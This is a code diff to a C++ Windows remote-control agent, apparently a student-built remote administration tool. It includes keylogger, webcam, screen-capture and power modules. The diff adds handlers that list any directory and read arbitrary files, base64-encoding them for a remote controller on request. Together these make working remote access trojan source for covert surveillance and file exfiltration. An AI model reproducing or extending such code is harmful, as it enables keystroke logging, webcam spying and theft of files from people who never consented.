@@ -3,14 +3,19 @@
 #include <thread> 
 #include <iphlpapi.h>
 #include <ws2tcpip.h>
+#include <filesystem>
+#include <fstream>
 #include "../Features/AppManager.cpp"
 #include "../Features/Power.cpp"
 #include "../Features/ScreenCap.cpp"
 #include "../Features/Keylogger.cpp"
 #include "../Features/Webcam.cpp"
+#include "../Features/Utils.h"
 #include "../Features/FileMgr.h"
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
+
+namespace fs = std::filesystem;
 
 using namespace std;
 using json = nlohmann::json;
@@ -79,7 +84,8 @@ void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
             server.SendFrame(json{{"type", "PONG"}}.dump());
             return; 
         }
-        auto req = json::parse(jsonMessage);
+        json jsonData = json::parse(jsonMessage);
+        json& req = jsonData;        
         string type = req["type"];
 
         // --- TAB 1 & 2: APPLICATIONS & PROCESSES ---
@@ -183,6 +189,89 @@ void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
                 {"filename", fileName}
             };
             server.SendFrame(response.dump());
+        }
+        else if (type == "GET_DRIVES" || type == "LIST_FILES") {
+            string path = "C:\\"; 
+            if (jsonData.contains("payload") && jsonData["payload"].contains("path")) {
+                path = jsonData["payload"]["path"];
+            } else if (jsonData.contains("path")) {
+                path = jsonData["path"];
+            }
+            
+            if(path.empty()) path = "C:\\";
+
+            if (path.length() > 3 && path.back() == '\\') {
+                path.pop_back();
+            }
+
+            cout << ">> [EXPLORER] Dang mo thu muc: " << path << endl; 
+
+            json fileList = json::array();
+            
+            if (!fs::exists(path) || !fs::is_directory(path)) {
+                 fileList.push_back({{"name", "[ERROR: PATH NOT FOUND]"}, {"type", "error"}});
+            } 
+            else {
+                try {
+                    for (const auto& entry : fs::directory_iterator(path)) {
+                        try {
+                            string name = entry.path().filename().string();
+                            string ftype = entry.is_directory() ? "folder" : "file";
+                            string size = "";
+                            
+                            if (!entry.is_directory()) {
+                                try {
+                                    size = to_string(entry.file_size() / 1024) + " KB";
+                                } catch (...) { size = "N/A"; }
+                            }
+
+                            fileList.push_back({
+                                {"name", name},
+                                {"type", ftype},
+                                {"path", entry.path().string()},
+                                {"size", size}
+                            });
+                        } catch (...) { continue; } 
+                    }
+                } catch (const fs::filesystem_error& e) {
+                    cout << "!! Loi Filesystem: " << e.what() << endl;
+                    fileList.push_back({{"name", "[ACCESS DENIED - Run Server as Admin]"}, {"type", "error"}});
+                }
+            }
+
+            json response;
+            response["type"] = "FILE_LIST";
+            response["payload"] = {
+                {"currentPath", path},
+                {"files", fileList}
+            };
+            server.SendFrame(response.dump());
+        }
+
+        else if (type == "DOWNLOAD_FILE") {
+            string filePath = "";
+            if (jsonData.contains("payload") && jsonData["payload"].contains("path")) {
+                filePath = jsonData["payload"]["path"];
+            } else if (jsonData.contains("path")) {
+                filePath = jsonData["path"];
+            }
+
+            ifstream file(filePath, ios::binary);
+            if (file.is_open()) {
+                vector<unsigned char> buffer(std::istreambuf_iterator<char>(file), {});
+                
+                string base64Data = Utils::Base64Encode(buffer.data(), buffer.size());
+
+                json response;
+                response["type"] = "FILE_CONTENT";
+                response["payload"] = {
+                    {"filename", fs::path(filePath).filename().string()},
+                    {"base64", base64Data}
+                };
+                server.SendFrame(response.dump());
+            } else {
+                cout << ">> [DOWNLOAD] Khong mo duoc file: " << filePath << endl;
+            }
         }
         
         else if (type == "GET_NETSTAT") {
